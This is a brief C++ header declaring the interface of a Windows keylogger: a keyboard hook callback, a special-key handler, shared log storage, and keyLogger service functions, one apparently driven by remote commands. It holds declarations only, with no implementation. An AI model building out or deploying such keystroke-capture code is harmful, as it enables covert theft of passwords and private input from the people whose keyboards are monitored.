#pragma once

#include <windows.h>
#include <fstream>
#include <mutex>
#include "serviceCommand.h"

extern std::mutex logMutex;
extern std::string logData;

namespace Services {
    bool keyLogger(const std::string &saveFile);

    std::vector<std::string> keyLogger(Command command);
}
bool SpecialKeys(int S_Key);
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);